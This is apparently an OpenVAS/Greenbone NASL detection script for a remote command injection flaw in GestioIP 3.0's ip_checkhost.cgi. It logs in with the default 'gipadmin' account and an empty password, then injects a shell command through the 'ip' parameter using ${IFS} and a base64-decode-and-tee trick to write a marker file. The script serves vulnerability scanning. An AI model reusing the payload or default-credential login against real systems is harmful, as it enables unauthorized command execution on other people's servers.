if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803953" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-10-11 19:37:30 +0530 (Fri, 11 Oct 2013)" );
	script_name( "GestioIP 'gestioip/ip_checkhost.cgi' Remote Command Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with GestioIP and is prone to a remote command injection
  vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted exploit string via HTTP GET request and creates a file.
  Exploit works only when GestioIP is installed with default credentials" );
	script_tag( name: "solution", value: "Upgrade to version 3.1 or later." );
	script_tag( name: "insight", value: "An error exists in ip_checkhost.cgi script which fails to properly sanitize
  user-supplied input to 'ip' parameter before using it." );
	script_tag( name: "affected", value: "GestioIP version 3.0, Other versions may also be affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to inject and execute
  arbitrary shell commands." );
	script_xref( name: "URL", value: "http://secunia.com/community/advisories/55091" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/gestioip-remote-command-execution" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
url = "/gestioip/";
req = http_get( item: url, port: port );
buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, "401 Authorization Required" ) && ContainsString( buf, "WWW-Authenticate: Basic realm=\"GestioIP\"" )){
	vtstrings = get_vt_strings();
	exploit = base64( str: vtstrings["default"] );
	userpass = "gipadmin:" + "";
	userpass64 = base64( str: userpass );
	file = vtstrings["lowercase_rand"] + ".txt";
	exploit_url = "ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}" + exploit + "|base64${IFS}--decode|tee${IFS}" + file + "):0000:000" + "0:0000:0000:0004&hostname=fds&client_id=1&ip_version=";
	exploit_rm = "ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}|base64${IFS}" + "--decode|tee${IFS}" + file + "):0000:0000:0000:0000:000" + "4&hostname=fds&client_id=1&ip_version=";
	host = http_host_name( port: port );
	req = NASLString( "GET ", url, exploit_url, " HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Authorization: Basic ", userpass64, "\\r\\n\\r\\n" );
	buf = http_keepalive_send_recv( port: port, data: req );
	req = NASLString( "GET ", url, file, " HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Authorization: Basic ", userpass64, "\\r\\n\\r\\n" );
	buf = http_keepalive_send_recv( port: port, data: req );
	req = NASLString( "GET ", url, exploit_rm, " HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Authorization: Basic ", userpass64, "\\r\\n\\r\\n" );
	http_keepalive_send_recv( port: port, data: req );
	if(buf && ContainsString( buf, vtstrings["default"] )){
		report = "Scanner has created a file " + file + " to check the vulnerability. Please remove this file as soon as possible.";
		security_message( port: port, data: report );
		exit( 0 );
	}
}

